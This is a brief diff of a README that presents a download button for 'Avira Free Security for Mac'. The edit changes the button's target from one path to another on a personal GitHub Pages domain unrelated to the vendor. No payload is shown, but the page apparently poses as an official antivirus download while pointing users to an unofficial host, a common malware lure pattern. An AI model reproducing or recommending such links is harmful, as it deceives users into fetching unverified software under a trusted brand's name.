@@ -21,7 +21,7 @@ To begin using this **Avira antivirus for Mac** and comprehensive **Mac security
 | :--- | :--- |
 | **Get Avira Free Security for Mac** | Click the button below to initiate the setup for this **Avira Free Security for Mac**. |
 
-[![Button](https://img.shields.io/badge/🛡️-Get_Avira_Free_Security_for_Mac-2ea44f?style=for-the-badge)](https://dolyairina88.github.io/.github/)
+[![Button](https://img.shields.io/badge/🛡️-Get_Avira_Free_Security_for_Mac-2ea44f?style=for-the-badge)](https://dolyairina88.github.io/.github/avira-free-security-for-mac)
 
 ## System Requirements
 
